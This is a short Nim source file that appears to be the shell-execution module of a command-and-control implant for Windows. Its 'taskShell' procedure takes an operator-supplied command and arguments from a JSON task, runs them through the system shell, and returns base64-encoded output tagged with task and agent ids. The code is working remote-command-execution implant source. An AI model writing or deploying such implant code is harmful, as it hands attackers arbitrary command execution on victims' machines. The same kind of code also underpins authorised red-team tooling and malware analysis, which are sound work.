import winim, osproc, strutils, strformat, base64, json

import ../types

proc taskShell*(task: Task): TaskResult = 

    # Parse arguments JSON string to obtain specific values 
    let 
        params = parseJson(task.args)
        command = params["command"].getStr()
        arguments = params["arguments"].getStr()

    echo fmt"Executing command {command} with arguments {arguments}"

    try: 
        let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(output),
            status: Completed 
        )

    except CatchableError as err: 
        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(fmt"An error occured: {err.msg}" & "\n"),
            status: Failed 
        )
